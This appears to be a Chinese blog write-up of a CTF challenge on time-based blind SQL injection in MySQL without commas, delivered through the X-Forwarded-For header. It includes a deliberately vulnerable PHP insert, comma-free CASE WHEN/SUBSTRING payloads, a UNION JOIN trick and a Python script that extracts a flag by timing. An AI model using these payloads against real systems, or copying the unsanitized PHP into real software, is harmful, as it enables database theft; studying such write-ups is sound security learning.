---
title: mysql无逗号的注入技巧
url: 442.html
id: 442
categories:
  - hack_ctf
date: 2016-05-31 14:05:04
tags:
  - mysql
  - sql inject
---

明天就要考试了，然而我还在任性的写代码，真是该剁手，剁手啊...
<!--more-->
在一个 ctf比赛中，遇到这样一个注入题：

用户的ip可以用x-forwarded-for来伪造，然后把ip存储到数据库中去，对ip没有进行任何过滤，存在注入，但是有一个限制就是:  用‘,’逗号对ip地址进行分割，仅仅取逗号前面的第一部分内容。

然后：没有报错，没有回显，没有bool，只有延时。 送一个字，坑。。。。。

比赛的时候，就各种纠结，想着怎么绕过逗号，没想出来，比赛结束之后，仔细想想，终于搞明白了，做以下的总结。

据我猜测，后台代码可能是这样的：

[php]

<?php
error_reporting(0);

function getIp(){
    $ip = '';
if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
      $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}else{
     $ip = $_SERVER['REMOTE_ADDR'];
}
   $ip_arr = explode(',', $ip);
   return $ip_arr[0];
}

$host="localhost";
$user="root";
$pass="root";
$db="sangebaimao";

$connect = mysql_connect($host, $user, $pass) or die("Unable to connect");

mysql_select_db($db) or die("Unable to select database");

$ip = getIp();
echo 'your ip is :'.$ip;
$sql="insert into client_ip (ip) values ('$ip')";
mysql_query($sql);


?>
[/php]

写一下我的数据库的表结构：

[sql]
CREATE TABLE IF NOT EXISTS `client_ip` (
 `id` int(11) NOT NULL AUTO_INCREMENT,
 `ip` varchar(200) DEFAULT NULL,
 PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=34 ;

CREATE TABLE IF NOT EXISTS `flag` (
 `flag` varchar(32) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

INSERT INTO `flag` (`flag`) VALUES
('327a6c4304ad5938eaf0efb6cc3e53dc');
[/sql]

我的目标是注出来flag表中的flag字段。

分析一下：

因为没有报错，没有回显。所以只能是延时盲注。

测试一下：

[python]
x-forwarded-for: 10.20.0.12'+sleep(5) and '1'='1

[/python]

果真延时了，注入是存在的，但是怎么出数据呢？？？
没有逗号，所以if函数就不能用了。
那用另外一个：

[sql]
select case when (条件) then 代码1 else 代码 2 end  
[/sql]

把判断搞定了，但是怎么截取字符串呢？ 截取字符串函数貌似都需要逗号啊！！！

百度了好久，才知道可以这样玩：

[sql]
 select substring((select user()) from 1 for 1);  #第一种方法
 select substring((select user()) from -1);  #第二种方法
[/sql]

<img class="alignnone size-full wp-image-452" src="/uploads/2016/05/QQ截图20160531142402.png" alt="QQ截图20160531142402" width="602" height="251" />

截取字符串的函数有了，判断也有了。那就搞定了：

找到两种payload

[sql]

insert into client_ip (ip) values ('ip'+(select case when (substring((select user()) from 1 for 1)='e') then sleep(3) else 0 end));  --第一种payload

insert into client_ip (ip) values ('ip'+(select case when (substring((select  user()) from -1)='t') then sleep(3) else 0 end));  --第二种payload

[/sql]

接下来就是写个脚本跑了：

[python]
#coding:utf-8 
import requests 
maystr="0987654321qwertyuiopasdfghjklzxcvbnm"
url="http://127.0.0.1/sql/sql.php"
flag=""
for i in range(32):
   for str in maystr:
     headers={"x-forwarded-for":"127.0.0.1'+"+"(select case when (substring((select flag from flag ) from %d for 1 )='%s') then sleep(6) else sleep(0) end ) and '1'='1"%(i+1,str)}
 # proxy={"http":"http://127.0.0.1:8080"}
 # res=requests.get(url,headers=headers,timeout=3)
     try: 
         res=requests.get(url,headers=headers,timeout=4)
     except requests.exceptions.ReadTimeout,e:
         flag=flag+str
         print "flag:",flag
         break 
     except KeyboardInterrupt,e:
        exit(0)
     else:
        pass
 # rint i+1,str
[/python]

再增加一种绕过逗号的姿势，比如说：

[sql]

select id,ip from client_ip where 1>2  union select * from  ( (select user())a JOIN  (select version())b );  --这个用于union 查询的注入

[/sql]

<img class="alignnone size-full wp-image-455" src="/uploads/2016/05/QQ截图20160531151817.png" alt="QQ截图20160531151817" width="1035" height="166" />

&nbsp;